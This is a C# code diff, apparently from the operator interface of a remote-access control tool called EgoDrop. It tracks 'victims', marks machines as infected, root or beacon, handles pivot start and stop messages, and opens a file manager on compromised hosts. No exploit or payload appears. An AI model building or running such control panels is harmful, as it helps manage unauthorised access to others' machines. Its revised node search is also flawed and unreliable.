@@ -100,9 +100,9 @@ namespace EgoDrop
             if (victim == null || victim.m_sktClnt == null || victim.m_sktClnt.RemoteEndPoint == null)
                 return;
 
-            if (lsMsg[0] == "info")
+            Invoke(new Action(() =>
             {
-                Invoke(new Action(() =>
+                if (lsMsg[0] == "info")
                 {
                     string szID = lsMsg[4];
                     if (listView1.Items.Count == 0 || listView1.FindItemWithText(szID, true, 0) == null)
@@ -128,8 +128,81 @@ namespace EgoDrop
                         //todo: Add to group treeview.
 
                     }
-                }));
-            }
+                }
+                else if (lsMsg[0] == "server")
+                {
+                    if (lsMsg[1] == "start")
+                    {
+                        int nCode = int.Parse(lsMsg[2]);
+                        string szMsg = lsMsg[3];
+
+                        if (nCode == 1)
+                        {
+                            Node node = networkView1.FindNodeWithID(szSrcVictimID);
+                            if (node == null)
+                            {
+                                clsTools.fnShowErrMsgbox("Node is null.");
+                                return;
+                            }
+
+                            //Change machine status.
+                            switch (node.MachineStatus)
+                            {
+                                case NetworkView.enMachineStatus.Linux_Infected:
+                                    networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Linux_Beacon);
+                                    break;
+                                case NetworkView.enMachineStatus.Linux_Super:
+                                    networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Linux_Beacon);
+                                    break;
+                                case NetworkView.enMachineStatus.Windows_Infected:
+                                    networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Windows_Beacon);
+                                    break;
+                                case NetworkView.enMachineStatus.Windows_Super:
+                                    networkView1.fnSetMachineStatus(node, NetworkView.enMachineStatus.Windows_Beacon);
+                                    break;
+                            }
+                        }
+                        else
+                        {
+                            clsTools.fnShowErrMsgbox(szMsg, "Pivoting");
+                        }
+                    }
+                    else if (lsMsg[1] == "stop")
+                    {
+                        int nCode = int.Parse(lsMsg[2]);
+                        string szMsg = lsMsg[3];
+
+                        if (nCode == 1)
+                        {
+                            Node node = networkView1.FindNodeWithID(szSrcVictimID);
+                            ListViewItem item = listView1.FindItemWithText(szSrcVictimID, true, 0);
+
+                            if (item == null)
+                                return;
+
+                            bool bRoot = string.Equals(item.SubItems[6].Text, "1");
+
+                            switch (node.MachineStatus)
+                            {
+                                case NetworkView.enMachineStatus.Linux_Beacon:
+                                    networkView1.fnSetMachineStatus(node, bRoot ? NetworkView.enMachineStatus.Linux_Super : NetworkView.enMachineStatus.Linux_Infected);
+                                    break;
+                                case NetworkView.enMachineStatus.Windows_Beacon:
+                                    networkView1.fnSetMachineStatus(node, bRoot ? NetworkView.enMachineStatus.Windows_Super : NetworkView.enMachineStatus.Windows_Infected);
+                                    break;
+                            }
+                        }
+                        else
+                        {
+                            clsTools.fnShowErrMsgbox(szMsg, "Pivoting");
+                        }
+                    }
+                }
+                else if (lsMsg[0] == "disconnect")
+                {
+                    fnOnVictimDisconnected(ltn, victim, szSrcVictimID);
+                }
+            }));
         }
 
         /// <summary>
@@ -139,16 +212,17 @@ namespace EgoDrop
         /// <param name="vic">Victim object.</param>
         public void fnOnVictimDisconnected(clsListener ltn, clsVictim vic, string szVictimID)
         {
-            TreeNode fnFindNode(List<string> lsVictim, TreeNode nodeParent = null)
+            TreeNode fnFindNode(string szID, TreeNode nodeParent = null)
             {
                 foreach (TreeNode node in nodeParent == null ? treeView2.Nodes : nodeParent.Nodes)
                 {
-                    if (string.Equals(node.Text, lsVictim.First()))
+                    if (string.Equals(node.Text, szID))
                     {
-                        if (lsVictim.Count == 1)
-                            return node;
-                        else
-                            return fnFindNode(lsVictim[1..], node);
+                        return node;
+                    }
+                    else
+                    {
+                        return fnFindNode(szID, node);
                     }
                 }
 
@@ -171,10 +245,16 @@ namespace EgoDrop
                 }
 
                 //Remove from treeview.
-
+                TreeNode tNode = fnFindNode(szVictimID);
+                treeView2.Nodes.Remove(tNode);
 
                 //Remove from networkview.
+                Node node = networkView1.FindNodeWithID(szVictimID);
+                networkView1.RemoveNode(node);
 
+                Node firewallNode = networkView1.FindNodeWithName($"Firewall@{vic.m_sktClnt.RemoteEndPoint}");
+                if (firewallNode.ChildNodes.Count == 0)
+                    networkView1.RemoveNode(firewallNode);
             }));
         }
 
@@ -291,6 +371,7 @@ namespace EgoDrop
                                 var fireWall = networkView1.AddNode(szName, szName, NetworkView.enMachineStatus.Firewall);
                                 networkView1.AddConnection(fireWall, n1);
                                 networkView1.MoveNodeToLeft(fireWall);
+                                networkView1.BringGraphIntoView();
                             }
 
                             continue;
@@ -302,7 +383,7 @@ namespace EgoDrop
                 }
                 catch (Exception ex)
                 {
-
+                    clsTools.fnShowErrMsgbox(ex.Message);
                 }
             }));
         }
@@ -504,6 +585,8 @@ namespace EgoDrop
 
             string szID = node.szVictimID;
             clsVictim victim = fnGetVictimWithID(szID);
+            if (victim == null)
+                return;
 
             frmFileMgr f = clsTools.fnFindForm<frmFileMgr>(victim, szID);
             if (f == null)
@@ -523,6 +606,11 @@ namespace EgoDrop
             f.ShowDialog();
 
             var ls = m_sqlite.fnlsGetGroups();
+        }
+
+        private void treeView2_AfterSelect(object sender, TreeViewEventArgs e)
+        {
+            treeView2.SelectedImageKey = treeView2.SelectedNode.ImageKey;
         }
     }
 }
